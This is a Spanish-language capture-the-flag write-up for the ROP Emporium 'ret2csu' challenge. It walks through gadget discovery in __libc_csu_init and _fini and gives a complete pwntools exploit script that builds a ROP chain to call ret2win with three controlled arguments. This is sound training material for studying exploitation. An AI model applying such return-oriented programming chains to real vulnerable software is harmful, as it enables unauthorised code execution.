---
title: ret2csu
date: 2024-08-23
platform: ROP Emporium
author: naibu3
---
#writeup #pwn 
# Reconocimiento

Como siempre comenzamos lanzando [[checksec]]:

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
RUNPATH:  b'.'
```

En el enunciado nos dicen que es igual al reto de [[callme]], pero con la diferencia de que nos será más difícil pasar el último argumento:

> **Same same, but different**
> This challenge is very similar to "callme", with the exception of the useful gadgets. Simply call the `ret2win()` function in the accompanying library with the same arguments you used to beat the "callme" challenge (`ret2win(0xdeadbeef, 0xcafebabe, 0xd00df00d)` for the ARM & MIPS binaries, `ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)` for the x86_64 binary).

Lo primero será buscar algunos gadgets con [[ropper]]:

```
0x00000000004006a3: pop rdi; ret; 
0x00000000004006a1: pop rsi; pop r15; ret;
```

Aunque busquemos con varias herramientas, no encontraremos ningún gadget que nos permita controlar *rdx* y por tanto, introducir el último argumento. Para ello, deberemos utilizar una técnica llamada [[pwn/Ret2csu|Ret2csu]], de forma que utilizaremos los *universal gadgets*, es decir, aquellos presentes en la función *__libc_csu_init*. 

```
disass __libc_csu_init 
Dump of assembler code for function __libc_csu_init:
[...]
   0x0000000000400680 <+64>:	mov    rdx,r15
   0x0000000000400683 <+67>:	mov    rsi,r14
   0x0000000000400686 <+70>:	mov    edi,r13d
   0x0000000000400689 <+73>:	call   QWORD PTR [r12+rbx*8]
   0x000000000040068d <+77>:	add    rbx,0x1
   0x0000000000400691 <+81>:	cmp    rbp,rbx
   0x0000000000400694 <+84>:	jne    0x400680 <__libc_csu_init+64>
   0x0000000000400696 <+86>:	add    rsp,0x8
   0x000000000040069a <+90>:	pop    rbx
   0x000000000040069b <+91>:	pop    rbp
   0x000000000040069c <+92>:	pop    r12
   0x000000000040069e <+94>:	pop    r13
   0x00000000004006a0 <+96>:	pop    r14
   0x00000000004006a2 <+98>:	pop    r15
   0x00000000004006a4 <+100>:	ret
```

Ahí encontramos gadgets bastante interesantes. Vemos que podemos controlar tanto *edi*, como *rsi*, y para *rdx*, simplemente debemos almacenar el valor en *r15* primero. Sin embargo, hay que tener en cuenta las instrucciones a las que se llama después, ya que tenemos un `call   QWORD PTR [r12+rbx*8]`. Una cosa que podemos hacer es saltar a *_fini* (aquí puedes leer una [POC](https://www.voidsecurity.in/2013/07/some-gadget-sequence-for-x8664-rop.html)):

```
disass _fini 
Dump of assembler code for function _fini:
   0x00000000004006b4 <+0>:	sub    rsp,0x8
   0x00000000004006b8 <+4>:	add    rsp,0x8
   0x00000000004006bc <+8>:	ret
```

Hay que tener en cuenta que no hay que pasar directamente la instrucción, sino un puntero a dicha instrucción. Con [[gdb]]-[[peda]], podemos buscarlo:

```
gdb-peda$ find 0x00000000004006b4
Searching for '0x00000000004006b4' in: None ranges
Found 1 results, display max 1 items:
ret2csu : 0x600e48 --> 0x4006b4 (<_fini>:	sub    rsp,0x8)
```

De esta forma, el valor de *rdx* se mantiene intacto. Además, realiza una suma y comparación `add rbx,0x1; cmp rbp,rbx;` así que tenemos que tener esto en cuenta. Lo más sencillo es que los registros valgan lo siguiente:

```
rbx = 0x0
rbp = 0x1
r12 = 0x600e48
```

# Explotación

Ya podemos ponernos a escribir un script:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

context.update(arch='amd64')
exe = './ret2csu'
elf = ELF(exe)


def start(argv=[], *a, **kw):
    
    return process([exe] + argv, *a, **kw)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

offset = 40*b"A"

# 0x00000000004006a3: pop rdi; ret;
poprdi = p64(0x00000000004006a3)

# 0x00000000004006a1: pop rsi; pop r15; ret;
poprsi_r15 = p64(0x00000000004006a1)

# 0x000000000040069a <+90>:	pop rbx; [...]
poprbx_rbp_r12_r13_r14_r15_ret = p64(0x40069a)

# Hay que tener en cuenta que al ser dinamically linked, debemos llamar al programa y ver en que direccion se almacena
ret2win = p64(elf.symbols['ret2win'])

# 0x0000000000400680 <+64>:	mov rdx,r15; [...]
movrdx_r15__call = p64(0x0000000000400680)

# ret2csu : 0x600e48 --> 0x4006b4 (<_fini>:	sub rsp,0x8)
fini = p64(0x600e48)

arg1 = 0xdeadbeefdeadbeef               #rdi
arg2 = 0xcafebabecafebabe               #rsi
arg3 = 0xd00df00dd00df00d               #rdx

ret = p64(0x4004e6)

payload = offset
payload += poprbx_rbp_r12_r13_r14_r15_ret
payload += p64(0)                           #rbx = 0, para que luego se le sume uno y la comparacion salga
payload += p64(1)                           #rbp = 1
payload += fini                             #r12 = *fini
payload += p64(1)                           #r13 (basura)
payload += p64(1)                           #r14 (basura)
payload += p64(arg3)                        #r15 = arg3, luego ira a rdx
payload += movrdx_r15__call
payload += p64(1)*7              #Mete 8 posiciones extra que el programa se va a saltar (add rsp,0x8)
payload += poprdi
payload += p64(arg1)
payload += poprsi_r15
payload += p64(arg2)
payload += p64(1)
#ayload += ret
payload += ret2win

io.recvuntil(b'> ')
io.sendline(payload)

io.interactive()
```